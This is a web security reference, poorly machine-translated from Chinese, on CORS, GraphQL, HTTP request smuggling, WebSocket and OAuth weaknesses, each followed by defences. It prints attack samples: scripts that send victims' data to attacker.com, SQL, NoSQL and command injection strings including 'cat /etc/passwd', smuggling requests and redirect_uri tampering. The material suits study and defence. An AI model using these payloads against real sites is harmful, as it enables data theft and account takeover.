# ModernWebProtocol security

> **Source**: Based onWooYunVulnerability database、OWASPand the industry's security practices are distilled and coverCORS、GraphQL、HTTPSmuggling、WebSocket、OAuthFive modernWebProtocol attack surface.
> **Methodology**: WooYunVulnerability essence formula + L1-L4Systematic analysis

---

## One、CORSMisconfiguration

### 1.1 Nature of vulnerabilities

```
CORSRisk = Access-Control-Allow-OriginOverly broad configuration × Sensitive interfaces lack additional authentication
```

The browser's same-origin policy is originally a security barrier,CORSMisconfiguration breaks it, allowing malicious sites to read sensitive user data across domains.

### 1.2 Detection method

```bash
# Basic detection: Send customOriginObserving Responses
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  → Danger!
# Access-Control-Allow-Credentials: true          → PortableCookieCross-domain requests
```

**Dangerous configuration mode**

| Pattern | Risk | Description |
|------|------|------|
| `Access-Control-Allow-Origin: *` | High | Wildcard, any domain can be read(But cannot carryCookie) |
| Dynamic reflectionOrigin | Extremely high | To send a requestOriginDirectly returned as response headers |
| `null` OriginAllow | High | `<iframe sandbox>`Can be constructednullSource |
| Regular expression matching defects | High | `evil.com.attacker.com`Matching`evil.com` |
| Subdomain wildcard | In | `*.target.com`Contains uncontrolled sub-domains |

### 1.3 Utilization method

```html
<!-- Malicious pages: Cross-domain theft of user data -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null OriginUtilize -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Defensive measures

- **Strict whitelist verificationOrigin**: Do not use dynamic reflection, use precise matching list
- Avoid`Access-Control-Allow-Origin: *`With`Access-Control-Allow-Credentials: true`Used simultaneously
- Avoid allowing`null` Origin
- Regular Matching Must Be Anchored(^and$), to prevent substring match bypass
- Sensitive interface increaseCSRF TokenOther authentication, not solely relying onCORS

---

## Two、GraphQLSecurity

### 2.1 Nature of vulnerabilities

```
GraphQLRisk = Powerful query capabilities × Default Open Introspection Mechanism × Lack of fine-grained authentication
```

GraphQLSingle endpoint exposes the entire data model, introspection mechanism provides completenessAPIDocument, attackers do not need to guess the interface.

### 2.2 Introspection query - Information leakage.

```graphql
# Obtain completeSchema(type、Field、Parameter)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Simplified version: only obtain query type
{__schema{queryType{name,fields{name}}}}

# ObtainmutationList
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Common attack vectors

**Injection attack**

```graphql
# Parameter concatenation leads toSQLInjection
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQLInjection
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**Batch queryDoS(Nested query exhausts resources)**

```graphql
# Deep nesting - Exponential database queries
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# Alias Batch Query - Enumerating a large amount of data in a single request
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# BatchmutationBrute force cracking
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Authentication bypass**

```graphql
# mutationMissing authentication checks
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Defensive measures

- **Disable introspection queries in the production environment**: Check`__schema`/`__type`Request and deny
- Query depth limit(Recommended maximum10Layer)Complexity analysis
- Rate limiting and query timeout(Anti-batching/NestedDoS)
- Field-level permission control(EachresolverIndependent authentication)
- Parameterized input processing(Anti-injection)、Prohibit String Concatenation to Build Queries
- Use Persistent Queries(Persisted Queries)Only allows pre-registered queries to be executed

---

## Three、HTTPRequest smuggling

### 3.1 Nature of vulnerabilities

```
Front-end Proxy(CDN/LB) With Backend server ToHTTPInconsistent Parsing of Request Boundaries
→ OneTCPConnecting"Smuggling"Additional requests → Impacting request processing for other users
```

Core contradiction:`Content-Length`(CL) With `Transfer-Encoding: chunked`(TE) When both are present, front-end and back-end choose different headers for parsing.

### 3.2 Three types of attack.

| Type | Front-end parsing | Backend parsing | Description |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | Frontend byCLForwarding, backend byTEAnalysis |
| TE.CL | Transfer-Encoding | Content-Length | Frontend byTEForwarding, backend byCLAnalysis |
| TE.TE | Transfer-Encoding | Transfer-Encoding | ObfuscationTEThe header causes one party to ignore |

### 3.3 ClassicPayload

**CL.TESmuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CLSmuggling**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TEConfusion variant**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detection and exploitation

```
Detection method:
1. SendCL/TEConflict Requests, Observe Timeout/Anomalous Response
2. Smuggle an incomplete request and see if subsequent requests are affected
3. Tool: Burp Suite HTTP Request SmugglerExpansion

Exploitation scenarios:
- Bypassing the front endWAF/ACL → Smuggling malicious requests to the backend
- Hijacking other users' requests → TheftCookie/Session
- Cache poisoning → Smuggling request contaminationCDNCached Content
- request routing hijacking → Redirect request to any backend
```

### 3.5 Defensive measures

- Frontend and backend use unifiedHTTPParsing library/Version
- Prohibited from occurring simultaneouslyCLandTEHeader, reject ambiguous requests
- DisableHTTP/1.0 Keep-AliveBackend Connection Reuse
- Upgrade toHTTP/2(Binary frame protocol, inherently immuneCL/TEAmbiguity)
- CDN/LBNormalize configuration request headers before forwarding

---

## Four、WebSocketSecurity

### 4.1 Nature of vulnerabilities

```
WebSocketRisk = HTTPBreaking away from the traditional security model after the handshake. × Persistent bidirectional channel lacks per-message authentication
```

WebSocketOnce the connection is established, subsequent messages no longer go through standardHTTPSecurity Mechanism(Cookie SameSite/CSRF TokenEtc.).

### 4.2 Cross-siteWebSocketHijack(CSWSH)

```html
<!-- Malicious pages: Hijacking usersWebSocketConnection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // Send requests as a victim
};
ws.onmessage = function(e) {
    // Stealing response data
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**Principle**:WebSocketHandshake is standardHTTPRequests, the browser will automatically carryCookie. If the server does not verifyOriginHeaders, malicious pages can establish authenticatedwsConnect.

### 4.3 Message injection

```javascript
// PassWebSocketSend injectionpayload
ws.send('{"query": "admin\' OR 1=1--"}');          // SQLInjection
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Command injection
```

### 4.4 Insufficient Authentication

| Issue | Risk | Description |
|------|------|------|
| Authenticate only during handshake | SessionConnection still valid after expiration | wsConnection can last for hours |
| No message-level authentication | Any connected client can perform all operations | Lackper-messageAuthorization check |
| TokenPlain text transmission | WebSocketUnencrypted(ws://) | Usewss://Forced encryption |

### 4.5 Defensive measures

- **verificationOriginHeader**: Check during handshakeOriginWhether on the whitelist(PreventionCSWSH)
- **TokenAuthentication**: Passed during the handshakeURLParameter or first message deliveryToken(Not dependentCookie)
- **Message verification**: Validate input and encode output for each message(Anti-injection)
- Usewss://Enforced encrypted transmission
- Implement heartbeat mechanism andSessionTimeout automatic disconnection
- Message rate limit(PreventionDoS)

---

## Five、OAuth 2.0/OIDCSecurity

### 5.1 Nature of vulnerabilities

```
OAuthRisk = Complex multi-party interaction process × Parameter validation is not strict × Implementation Deviates from Specifications
```

OAuthThe authorization process involves the client.、Authorization server、Resource server third-party interaction, improper configuration of any link can lead toTokenLeak or account takeover.

### 5.2 redirect_uriManipulation

```
# Normal process
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# Attack: Tamperredirect_uriStealing authorization codes.
redirect_uri=https://attacker.com/steal           # Complete replacement
redirect_uri=https://app.com.attacker.com/callback # Subdomain obfuscation
redirect_uri=https://app.com/callback/../../../attacker # Path traversal
redirect_uri=https://app.com/callback?next=https://attacker.com # Open redirect chain
```

### 5.3 Common attack vectors

| Attack type | Principle | Exploitable conditions |
|----------|------|----------|
| CSRFAttack | stateMissing or Predictable Parameters | Bind the attacker’s account to the victim |
| TokenDisclosure(Referer) | Implicit modetokenInURL FragmentIn | The page contains references to external resources |
| TokenDisclosure(Log) | Authorization code/tokenrecorded in server logs | Logs accessible |
| PKCEBypass | Public client not usedcode_challenge | Intercept the authorization code to exchangetoken |
| IdPObfuscation(Mix-Up) | MultipleIdPObfuscate authorization response source in scenarios | The client supports multipleOAuthVendors |
| Authorization code replay | Authorization code not single-use | Intercept authorization codes for repeated redemption |

### 5.4 CSRFWithstateParameters

```
# Attack process (stateWhen missing)
1. Attackers InitiateOAuthAuthorization, obtaining the authorization code for one's own account
2. Construct Link: https://app.com/callback?code=ATTACKER_CODE
3. Lure victims to click → Victim account linked to the attacker's third-party account
4. Attackers logging in with third-party accounts → Take over victim account

# Defense: stateParameters
state=Random Unpredictable Values(Bind userSession)
→ Verification during callbackstateWithSessionMatching
```

### 5.5 Implicit Mode Risk

```
# Implicit mode(Implicit Flow) - No longer recommended
https://app.com/callback#access_token=eyJ...&token_type=bearer

Risk:
- TokenInURL FragmentCan be viewed in browser history/RefererHeader leakage
- Cannot userefresh_token, poor user experience
- Unable to bind client identity(Noneclient_secret)

→ Alternative solutions: Authorization Code Flow + PKCE
```

### 5.6 Defensive measures

- **Strictredirect_uriWhitelist**: Exact match(Wildcards not allowed/Subpath)
- **ForcestateParameters**: BindingSession、Unpredictable、One-time use
- **ForcePKCE**: All Clients(Especially Public Clients/SPA)Must usecode_challenge
- UseAuthorization Code Flow, DeprecatedImplicit Flow
- Authorization code for one-time use, short validity period(Recommendation10Within Minutes)
- TokenBind(DPoP/mTLS)PreventTokenMisappropriated
- Regularly audit authorized third-party applications and scope of permissions

---

*Based onWooYunVulnerability database(88,636Item.)Refine + OWASP/RFCSecurity standard | For security research and defense reference only*
